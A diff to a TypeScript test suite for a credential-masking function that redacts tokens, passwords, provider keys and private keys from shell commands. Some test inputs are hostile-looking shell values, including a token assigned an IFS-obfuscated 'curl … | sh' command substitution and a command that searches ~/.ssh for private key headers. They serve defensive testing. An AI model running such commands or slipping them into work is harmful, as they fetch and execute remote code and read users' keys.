@@ -168,164 +168,94 @@ const DATABASE_URL = (password: string) =>
 
 describe("maskCredentials", () => {
   it.each([
-    // Shell syntax stays readable on a permission: it is what is approved.
+    // Only the value goes: the name, its quotes, and a scheme word stay.
+    [assigned("GITHUB_TOKEN", SAMPLE), assigned("GITHUB_TOKEN", M)],
+    [assigned("token", "AbCdEfGh_IjKlMnOp"), assigned("token", M)],
+    [assigned("password", "P@ssw0rd!2024"), assigned("password", M)],
+    [assigned("password", '"hunter2hunter2"'), assigned("password", `"${M}"`)],
+    [assigned("token", `'${SAMPLE}'`), assigned("token", `'${M}'`)],
+    [`password: ${SAMPLE}`, `password: ${M}`],
+    [`curl -H "X-Api-Key: ${SAMPLE}" x`, `curl -H "X-Api-Key: ${M}" x`],
     [
-      "narrow",
-      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
-      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
-    ],
-    ["narrow", "rm -rf token: ../../..", "rm -rf token: ../../.."],
-    [
-      "narrow",
-      "rm -rf bearer projects2024archive1",
-      "rm -rf bearer projects2024archive1",
-    ],
-    [
-      "narrow",
-      assigned("token", '"$(curl x|sh)"'),
-      assigned("token", '"$(curl x|sh)"'),
-    ],
-    [
-      "narrow",
-      assigned("token", "/etc/secret"),
-      assigned("token", "/etc/secret"),
-    ],
-    ["narrow", "a basic installation", "a basic installation"],
-    // A flag's dashes are not part of its name.
-    [
-      "narrow",
-      `deploy --${assigned("token", SAMPLE)}`,
-      `deploy --${assigned("token", M)}`,
-    ],
-    [
-      "narrow",
-      `export ${assigned("token", SAMPLE)}`,
-      `export ${assigned("token", M)}`,
-    ],
-    [
-      "narrow",
-      assigned("password", "'hunter2hunter2'"),
-      assigned("password", `'${M}'`),
-    ],
-    // A value ends where a shell word does, and the boundary stays.
-    [
-      "narrow",
-      `export ${assigned("TOKEN", SAMPLE)}; ./deploy.sh`,
-      `export ${assigned("TOKEN", M)}; ./deploy.sh`,
-    ],
-    [
-      "narrow",
       `curl -d "${assigned("token", SAMPLE)}" x`,
       `curl -d "${assigned("token", M)}" x`,
     ],
-    ["narrow", `${assigned("token", SAMPLE)}&&`, `${assigned("token", M)}&&`],
-    ["narrow", `(${assigned("token", SAMPLE)})`, `(${assigned("token", M)})`],
-    // A bearer token only where a header names it.
     [
-      "narrow",
-      `curl -H "${AUTHORIZATION("Bearer", OPAQUE)}"`,
-      `curl -H "${AUTHORIZATION("Bearer", M)}"`,
+      `export ${assigned("TOKEN", SAMPLE)}; ./deploy.sh`,
+      `export ${assigned("TOKEN", M)}; ./deploy.sh`,
     ],
-    // A key prefix counts only with a real key's length behind it.
-    ["narrow", "rm -rf sk-backups", "rm -rf sk-backups"],
-    ["narrow", "push ghp_leaked0000 now", "push ghp_leaked0000 now"],
-    ["narrow", `push ${GITHUB_KEY} now`, `push ${M} now`],
-    ["narrow", `use ${OPENAI_KEY} now`, `use ${M} now`],
-    // A name that ends in a credential word counts, as a logged field's does.
+    // A flag's dashes are not part of its name.
     [
-      "narrow",
-      `export ${assigned("AWS_SECRET_ACCESS_KEY", SAMPLE)}`,
-      `export ${assigned("AWS_SECRET_ACCESS_KEY", M)}`,
+      `deploy --${assigned("token", SAMPLE)}`,
+      `deploy --${assigned("token", M)}`,
     ],
+    // A name that is not secret leaves its value to be read for one that is.
     [
-      "narrow",
-      `export ${assigned("DB_PASSWORD", SAMPLE)}`,
-      `export ${assigned("DB_PASSWORD", M)}`,
-    ],
-    ["narrow", assigned("bypass", "true"), assigned("bypass", "true")],
-    // A provider key the scanner knows by its shape, wherever it stands.
-    ["narrow", `use ${STRIPE_KEY} now`, `use ${M} now`],
-    // A URL loses only its password, and a URL without one stays whole.
-    ["narrow", `psql ${DATABASE_URL(SAMPLE)}`, `psql ${DATABASE_URL(M)}`],
-    [
-      "narrow",
-      "psql postgres://db.invalid:5432/app",
-      "psql postgres://db.invalid:5432/app",
-    ],
-    [
-      "narrow",
-      "psql postgres://app@db.invalid/app",
-      "psql postgres://app@db.invalid/app",
-    ],
-    // A preview, a question, or a tool's data masks anything credential-shaped,
-    // and only the value: the name, the quotes, and a scheme word stay.
-    ["broad", assigned("GITHUB_TOKEN", SAMPLE), assigned("GITHUB_TOKEN", M)],
-    ["broad", assigned("token", "AbCdEfGh_IjKlMnOp"), assigned("token", M)],
-    ["broad", assigned("password", "P@ssw0rd!2024"), assigned("password", M)],
-    [
-      "broad",
-      assigned("password", '"hunter2hunter2"'),
-      assigned("password", `"${M}"`),
-    ],
-    ["broad", assigned("token", `'${SAMPLE}'`), assigned("token", `'${M}'`)],
-    ["broad", `password: ${SAMPLE}`, `password: ${M}`],
-    [
-      "broad",
-      `curl -H "X-Api-Key: ${SAMPLE}" x`,
-      `curl -H "X-Api-Key: ${M}" x`,
-    ],
-    [
-      "broad",
       `${assigned("user", "a")}&${assigned("token", SAMPLE)}`,
       `${assigned("user", "a")}&${assigned("token", M)}`,
     ],
-    ["broad", assigned("id_hint", JWT), assigned("id_hint", M)],
+    [assigned("id_hint", JWT), assigned("id_hint", M)],
     // A value that only names a secret stays readable.
     [
-      "broad",
       `export ${assigned("TOKEN", "$TOKEN")}`,
       `export ${assigned("TOKEN", "$TOKEN")}`,
     ],
-    ["broad", `password: <password>`, `password: <password>`],
-    ["broad", "Basic authentication", "Basic authentication"],
-    ["broad", "a bearer instrument", "a bearer instrument"],
-    ["broad", "Authorization: Basic dXNlcjpwYXNz", `Authorization: Basic ${M}`],
-    ["broad", "send Bearer AbCdEfGhIjKlMnOpQrSt", `send Bearer ${M}`],
-    ["broad", "send Basic dXNlcjpwYXNz.", `send Basic ${M}.`],
-    ["broad", `send Bearer ${JWT}`, `send Bearer ${M}`],
-    ["broad", `Bearer ${["ya29", "a0AfH6SMBxyz"].join(".")}`, `Bearer ${M}`],
-    // Capitalised prose is not a token.
-    ["broad", "Enable Basic Authentication?", "Enable Basic Authentication?"],
-    ["broad", "a Bearer Instrument", "a Bearer Instrument"],
-  ] as const)("masks %s: %s", (strength, text, expected) => {
-    expect(maskCredentials(text, strength)).toBe(expected)
+    [
+      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
+      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
+    ],
+    [`password: <password>`, `password: <password>`],
+    // Provider keys by their prefix or the shape the scanner knows.
+    [`push ${GITHUB_KEY} now`, `push ${M} now`],
+    [`use ${OPENAI_KEY} now`, `use ${M} now`],
+    [`use ${STRIPE_KEY} now`, `use ${M} now`],
+    // A URL loses only its password, and a URL without one stays whole.
+    [`psql ${DATABASE_URL(SAMPLE)}`, `psql ${DATABASE_URL(M)}`],
+    [
+      "psql postgres://db.invalid:5432/app",
+      "psql postgres://db.invalid:5432/app",
+    ],
+    [
+      "psql postgres://app@db.invalid/app",
+      "psql postgres://app@db.invalid/app",
+    ],
+    // A Basic or Bearer token mixes kinds of character; prose does not.
+    [
+      `curl -H "${AUTHORIZATION("Bearer", OPAQUE)}"`,
+      `curl -H "${AUTHORIZATION("Bearer", M)}"`,
+    ],
+    ["Authorization: Basic dXNlcjpwYXNz", `Authorization: Basic ${M}`],
+    ["send Bearer AbCdEfGhIjKlMnOpQrSt", `send Bearer ${M}`],
+    ["send Basic dXNlcjpwYXNz.", `send Basic ${M}.`],
+    [`send Bearer ${JWT}`, `send Bearer ${M}`],
+    [`Bearer ${["ya29", "a0AfH6SMBxyz"].join(".")}`, `Bearer ${M}`],
+    ["Basic authentication", "Basic authentication"],
+    ["a bearer instrument", "a bearer instrument"],
+    ["Enable Basic Authentication?", "Enable Basic Authentication?"],
+    ["a Bearer Instrument", "a Bearer Instrument"],
+  ] as const)("masks %s as %s", (text, expected) => {
+    expect(maskCredentials(text)).toBe(expected)
   })
 
   it.each([
-    [assigned("token", SAMPLE), assigned("token", M)],
-    [AUTHORIZATION("Bearer", OPAQUE), AUTHORIZATION("Bearer", M)],
-    [DATABASE_URL(SAMPLE), DATABASE_URL(M)],
-  ])(
-    "masks %s once when a broad mask follows a narrow one",
-    (text, expected) => {
-      expect(maskCredentials(maskCredentials(text, "narrow"), "broad")).toBe(
-        expected
-      )
-    }
-  )
+    [assigned("token", SAMPLE)],
+    [AUTHORIZATION("Bearer", OPAQUE)],
+    [DATABASE_URL(SAMPLE)],
+  ])("masks %s once, however often it is masked", (text) => {
+    expect(maskCredentials(maskCredentials(text))).toBe(maskCredentials(text))
+  })
 
-  // The names a Hermes terminal assigns, which the shared name rule now reads
-  // for every runtime: none ends in a term after a separator.
+  // The names a Hermes terminal assigns, which the shared name rule reads for
+  // every runtime: none ends in a term after a separator.
   it.each([
     "PGPASSWORD",
     "SSH_PRIVATE_KEY_B64",
     "NPM_CONFIG__AUTH",
     "2fa_token",
-  ])("masks the value assigned to %s at either strength", (name) => {
-    for (const strength of ["narrow", "broad"] as const)
-      expect(maskCredentials(`${assigned(name, SAMPLE)} psql`, strength)).toBe(
-        `${assigned(name, M)} psql`
-      )
+  ])("masks the value assigned to %s", (name) => {
+    expect(maskCredentials(`${assigned(name, SAMPLE)} psql`)).toBe(
+      `${assigned(name, M)} psql`
+    )
   })
 
   it("reads a YAML child's name as a name, not as its parent's value", () => {
@@ -334,28 +264,20 @@ describe("maskCredentials", () => {
     )
   })
 
-  it.each(["narrow", "broad"] as const)(
-    "masks a private key whole at %s strength, and one cut short to the end",
-    (strength) => {
-      const header = "-----BEGIN RSA PRIVATE KEY-----"
-      const footer = "-----END RSA PRIVATE KEY-----"
-      expect(
-        maskCredentials(
-          `cat id_rsa\n${header}\nMIIEow${SAMPLE}\n${footer}\ndone`,
-          strength
-        )
-      ).toBe(`cat id_rsa\n${M}\ndone`)
-      expect(maskCredentials(`ok\n${header}\nMIIEow${SAMPLE}`, strength)).toBe(
-        `ok\n${M}`
-      )
-    }
-  )
+  it("masks a private key whole, and one cut short to its last line", () => {
+    const header = "-----BEGIN RSA PRIVATE KEY-----"
+    const footer = "-----END RSA PRIVATE KEY-----"
+    expect(
+      maskCredentials(`cat id_rsa\n${header}\nMIIEow${SAMPLE}\n${footer}\ndone`)
+    ).toBe(`cat id_rsa\n${M}\ndone`)
+    expect(maskCredentials(`ok\n${header}\nMIIEow${SAMPLE}`)).toBe(`ok\n${M}`)
+  })
 
-  // A header alone is no key: an approval that only names one shows it.
+  // A header alone is no key: a command that only names one reads as written.
   it("keeps a command that names a private key's header as written", () => {
     const command =
       "grep -rl -- '-----BEGIN OPENSSH PRIVATE KEY-----' ~/.ssh && rm -rf build"
-    expect(maskCredentials(command, "narrow")).toBe(command)
+    expect(maskCredentials(command)).toBe(command)
   })
 
   it("still masks a provider key deep inside a long run without whitespace", () => {
@@ -374,31 +296,18 @@ describe("maskCredentials", () => {
 
   // Every shape used to restart at each repeat and read to the end of the
   // text: 128 KiB of one took seconds to mask, and some took minutes.
-  it.each(
-    (
-      [
-        ["separated words", "a-", ""],
-        ["JWT heads", "eyJ-", ""],
-        ["key prefixes", "sk-", ""],
-        ["assignments before shell syntax", "token=", "$"],
-        ["bare assignments", "a=", ""],
-        ["URL heads", "x://a:", ""],
-        ["private key headers", "-----BEGIN PRIVATE KEY----- ", ""],
-      ] as const
-    ).flatMap(([kind, unit, end]) =>
-      (["narrow", "broad"] as const).map(
-        (strength) => [kind, strength, unit, end] as const
-      )
-    )
-  )(
-    "masks 128 KiB of %s in one pass at %s strength",
-    (_kind, strength, unit, end) => {
-      const text = unit.repeat(Math.ceil(131_072 / unit.length)) + end
-      const started = performance.now()
-      maskCredentials(text, strength)
-      expect(performance.now() - started).toBeLessThan(1_000)
-    }
-  )
+  it.each([
+    ["separated words", "a-"],
+    ["JWT heads", "eyJ-"],
+    ["bare assignments", "a="],
+    ["URL heads", "x://a:"],
+    ["private key headers", "-----BEGIN PRIVATE KEY----- "],
+  ])("masks 128 KiB of %s in one pass", (_kind, unit) => {
+    const text = unit.repeat(Math.ceil(131_072 / unit.length))
+    const started = performance.now()
+    maskCredentials(text)
+    expect(performance.now() - started).toBeLessThan(1_000)
+  })
 })
 
 describe("isSecretName", () => {
